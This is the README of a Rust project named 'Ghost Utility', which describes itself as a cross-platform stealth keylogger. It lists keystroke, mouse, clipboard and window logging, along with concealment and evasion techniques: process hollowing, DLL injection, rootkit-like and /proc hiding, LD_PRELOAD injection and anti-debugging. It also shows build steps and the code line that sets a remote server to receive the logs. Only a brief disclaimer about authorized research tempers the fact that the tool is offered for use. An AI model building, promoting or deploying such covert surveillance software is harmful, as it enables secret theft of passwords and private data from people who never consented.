# Ghost Utility (Rust)

## Overview
This is a cross-platform (Windows, Linux, MacOS) stealth keylogger written in Rust. It uses native APIs and stealth techniques to log keystrokes, mouse events, clipboard changes, and window switches. It can also send logs to a remote server over a secure TLS connection.

## Features
- **Windows:**
  - Keyboard and mouse hooks
  - Clipboard monitoring
  - Window switch detection
  - Stealth techniques: process hollowing, DLL injection, registry hiding, rootkit-like hiding, anti-debugging
- **Linux:**
  - Keyboard logging via `rdev`
  - Stealth techniques: process masquerading, LD_PRELOAD injection, /proc hiding, anti-debugging
- **Network Logging:**
  - Optional TLS-encrypted log transmission to a remote server

## Requirements
- Rust (latest stable)
- Windows: No extra dependencies
- Linux: `rdev` crate (for keylogging)
- MacOS: Partial support (keylogging not implemented)

## Building
```
cargo build --release
```

## Running
```
cargo run --release
```

- By default, logs are saved to `stealth_keylog.txt` in the current directory.
- To enable network logging, edit the `main` function in `src/main.rs` and provide your server address and port:
  ```rust
  let keylogger = StealthKeylogger::new(Some(("127.0.0.1".to_string(), 8080)));
  ```

## Notes
- **Windows:** Some stealth features require running as administrator.
- **Linux:** Some stealth features require root privileges.
- **Clipboard logging** is a placeholder and does not capture clipboard content for security reasons.
- **This software is for educational and authorized security research purposes only.**

## License
MIT
